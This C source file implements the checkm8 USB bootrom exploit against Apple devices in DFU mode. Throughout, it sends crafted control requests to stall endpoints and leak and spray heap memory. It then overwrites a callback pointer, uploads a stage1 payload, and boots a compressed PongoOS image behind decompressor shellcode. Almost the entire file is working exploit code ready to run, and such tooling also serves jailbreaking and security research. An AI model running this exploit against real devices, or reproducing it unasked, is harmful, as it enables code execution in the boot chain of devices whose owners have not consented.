#include <checkm8.h>

#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>

#include <payload.h>
#include <dfu.h>
#include <stage1.h>
#include <utils.h>
#include <shim.h>
#include <gen/payloads/lz4dec.h>

#include <lz4/lz4.h>
#include <lz4/lz4hc.h>

static struct {
    uint8_t b_len, b_descriptor_type;
    uint16_t bcd_usb;
    uint8_t b_device_class, b_device_sub_class, b_device_protocol, b_max_packet_sz;
    uint16_t id_vendor, id_product, bcd_device;
    uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
} device_descriptor;

static bool dfu_check_status(const usb_handle_t *handle, uint8_t status, uint8_t state)
{
    struct {
        uint8_t status, poll_timeout[3], state, str_idx;
    } dfu_status;

    transfer_ret_t result;

    result = send_usb_control_request(handle, 0xA1, DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status));

    return result.ret == USB_TRANSFER_OK
        && result.sz == sizeof(dfu_status)
        && dfu_status.status == status
        && dfu_status.state == state;
}

static bool dfu_set_state_wait_reset(const usb_handle_t *handle)
{
    transfer_ret_t result;

    result = send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0);

    return result.ret == USB_TRANSFER_OK
        && result.sz == 0
        && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC)
        && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST)
        && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
}

checkm8_err_t checkm8_stage_reset(const usb_handle_t *handle)
{
    transfer_ret_t result;

    result = send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN);
    if (result.ret != USB_TRANSFER_OK || result.sz != DFU_FILE_SUFFIX_LEN)
        goto fail;

    if (!dfu_set_state_wait_reset(handle))
        goto fail;

    result = send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ);
    if (result.ret != USB_TRANSFER_OK || result.sz != EP0_MAX_PACKET_SZ)
        goto fail;

    return CHECKM8_ERR_NONE;

fail:
    send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0);

    return CHECKM8_ERR_TRANSFER_FAILED;
}

checkm8_err_t checkm8_stage_setup(const usb_handle_t *handle, struct DeviceConfiguration *deviceConfig)
{
    unsigned usb_abort_timeout = USB_TIMEOUT - 1;
    transfer_ret_t result;

    for (;;) {
        result = send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout);

        if (result.sz < deviceConfig->config_overwrite_pad) {
            result = send_usb_control_request_no_data(handle, 0, 0, 0, 0, deviceConfig->config_overwrite_pad - result.sz);

            if (result.ret == USB_TRANSFER_STALL)
                return CHECKM8_ERR_NONE;
        }

        send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ);
        usb_abort_timeout = (usb_abort_timeout + 1) % (USB_TIMEOUT + 1);
    }

    return CHECKM8_ERR_TRANSFER_FAILED;
}

static bool checkm8_usb_request_leak(const usb_handle_t *handle) {
    transfer_ret_t result;

    result = send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1);
    return result.sz == 0;
}

static void checkm8_stall(const usb_handle_t *handle)
{
    unsigned usb_abort_timeout = USB_TIMEOUT - 1;
    transfer_ret_t result;

    for (;;) {
        result = send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ, usb_abort_timeout);

        if (result.sz < 3 * EP0_MAX_PACKET_SZ && checkm8_usb_request_leak(handle))
            break;

        usb_abort_timeout = (usb_abort_timeout + 1) % (USB_TIMEOUT + 1);
    }
}

static bool checkm8_no_leak(const usb_handle_t *handle)
{
    transfer_ret_t result;

    result = send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ + 1, 1);

    return result.sz == 0;
}

static bool checkm8_usb_request_stall(const usb_handle_t *handle)
{
    transfer_ret_t result;

    result = send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0);

    return result.ret == USB_TRANSFER_STALL;
}

char *get_usb_serial_number(usb_handle_t *handle)
{
    transfer_ret_t result;
    uint8_t buf[UINT8_MAX];
    char *str = NULL;
    size_t i, sz;

    result = send_usb_control_request(handle, 0x80, 6, 1U << 8U, 0, &device_descriptor, sizeof(device_descriptor));

    if (result.ret != USB_TRANSFER_OK || result.sz != sizeof(device_descriptor))
        return NULL;

    result = send_usb_control_request(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, 0x409, buf, sizeof(buf));

    if (result.ret != USB_TRANSFER_OK || result.sz != buf[0])
        return NULL;

    sz = buf[0] / 2;
    if (sz == 0)
        return NULL;

    str = malloc(sz);
    if (str == NULL)
        return NULL;

    for (i = 0; i < sz; ++i)
        str[i] = (char)buf[2 * (i + 1)];

    str[sz - 1] = '\0';

    return str;
}

checkm8_err_t checkm8_stage_spray(const usb_handle_t *handle, struct DeviceConfiguration *deviceConfig) {
    size_t i;
    transfer_ret_t result;

    if(deviceConfig->config_large_leak == 0) {
        if(deviceConfig->cpid == A8X || deviceConfig->cpid == A8 || deviceConfig->cpid == S1 || deviceConfig->cpid == A9_TSMC || deviceConfig->cpid == A9) {
            while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
        } else {
            checkm8_stall(handle);
            for(i = 0; i < deviceConfig->config_hole; ++i) {
                while(!checkm8_no_leak(handle)) {}
            }
            while(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
        }
        send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1);
    } else {
        for(i = 0; i < deviceConfig->config_large_leak; ++i) {
            while(!checkm8_usb_request_stall(handle)) {}
        }
        send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0);
    }

    return CHECKM8_ERR_NONE;
}

checkm8_err_t checkm8_stage_patch(const usb_handle_t *handle, struct DeviceConfiguration *deviceConfig, struct PayloadConfiguration *payloadConfig) {
    size_t i, data_sz, packet_sz;
    void *data;
    transfer_ret_t result;
    bool ret = false;

    const uint8_t *checkra1n_payload = NULL;
    void *overwrite = NULL;
    size_t checkra1n_payload_sz = 0;
    size_t overwrite_sz = 0;

    checkm8_overwrite_t checkm8_overwrite;
    memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
    checkm8_overwrite.callback.next = payloadConfig->insecure_memory_base;
    overwrite = &checkm8_overwrite;
    overwrite_sz = sizeof(checkm8_overwrite);

    ret = create_pongo_payload_for_device(deviceConfig->cpid, &checkra1n_payload, &checkra1n_payload_sz);
    if (!ret) return CHECKM8_ERR_UNSUPPORTED;

    ret = generate_stage1(&data, &data_sz, checkra1n_payload, checkra1n_payload_sz, deviceConfig, payloadConfig);
    if (!ret) return CHECKM8_ERR_INVALID_PAYLOAD;

    if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
        LOG_DEBUG("successfully leaked data");
    } else {
        LOG_ERROR("failed to leak data");
        return CHECKM8_ERR_TRANSFER_FAILED;
    }

    for (i = 0; i < 2; i++) {
        LOG_DEBUG("i = %zu", i);
        result = send_usb_control_request_no_data(handle, 2, 3, 0, 0x80, 0);
    }

    if (overwrite != NULL) {
        result = send_usb_control_request(handle, 0x00, 0, 0, 0x00, overwrite, overwrite_sz);
        if (result.ret != USB_TRANSFER_STALL) {
            LOG_ERROR("failed to send overwrite data");
            return CHECKM8_ERR_TRANSFER_FAILED;
        }

        for (i = 0; ret && i < data_sz; i += packet_sz) {
            packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);

            result = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz);
        }

        result = send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0);
    }

    // todo: do something with the result

    free(data);

    return ret ? CHECKM8_ERR_NONE : CHECKM8_ERR_TRANSFER_FAILED;
}

static bool compress_pongo(const uint8_t *bin, size_t bin_len, uint8_t **out, size_t *out_len)
{
    int src_size = (int)bin_len;
    int max_size = LZ4_compressBound(src_size);

    uint8_t *buf = malloc(max_size);
    if (!buf)
        return false;

    int size = LZ4_compress_HC(
        (const char *)bin,
        (char *)buf,
        src_size,
        max_size,
        LZ4HC_CLEVEL_MAX
    );

    if (size <= 0) {
        free(buf);
        return false;
    }

    *out = buf;
    *out_len = (size_t)size;

    return true;
}

#define SHELLCODE_SZ (512)

bool prepare_pongo(uint8_t **out, size_t *out_len, const uint8_t *pongo_bin, size_t pongo_bin_len)
{
    size_t pongoSize;
    uint8_t *pongo;

    if (!compress_pongo(pongo_bin, pongo_bin_len, &pongo, &pongoSize))
        return false;

    uint8_t *payload = malloc(SHELLCODE_SZ + pongoSize);
    if (!payload) {
        free(pongo);
        return false;
    }

    memcpy(payload, payloads_lz4dec_bin, SHELLCODE_SZ);
    memcpy(payload + SHELLCODE_SZ, pongo, pongoSize);

    free(pongo);

    pongo = payload;
    pongoSize += SHELLCODE_SZ;

    uint32_t *pongoSizeInData = (uint32_t *)(pongo + 0x1fc);
    *pongoSizeInData = (uint32_t)(pongoSize - SHELLCODE_SZ);

    *out = pongo;
    *out_len = pongoSize;

    return true;
}

checkm8_err_t checkm8_boot_pongo(usb_handle_t *handle, const uint8_t *pongo_bin, size_t pongo_bin_len)
{
    transfer_ret_t result;

    size_t len = 0;

    while (len < pongo_bin_len) {
        size_t chunk = (pongo_bin_len - len > 0x800) ? 0x800 : (pongo_bin_len - len);
    retry:
        result = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, pongo_bin + len, chunk);

        if (result.sz != chunk || result.ret != USB_TRANSFER_OK)
        {
            LOG_DEBUG("retrying at len = %zu", len);
            sleep_ms(100);
            goto retry;
        }

        len += chunk;
        LOG_DEBUG("len = %zu", len);
    }

    result = send_usb_control_request_no_data(handle, 0x21, 4, 0, 0, 0);
    if (result.ret != USB_TRANSFER_OK)
        return CHECKM8_ERR_TRANSFER_FAILED;

    return CHECKM8_ERR_NONE;
}
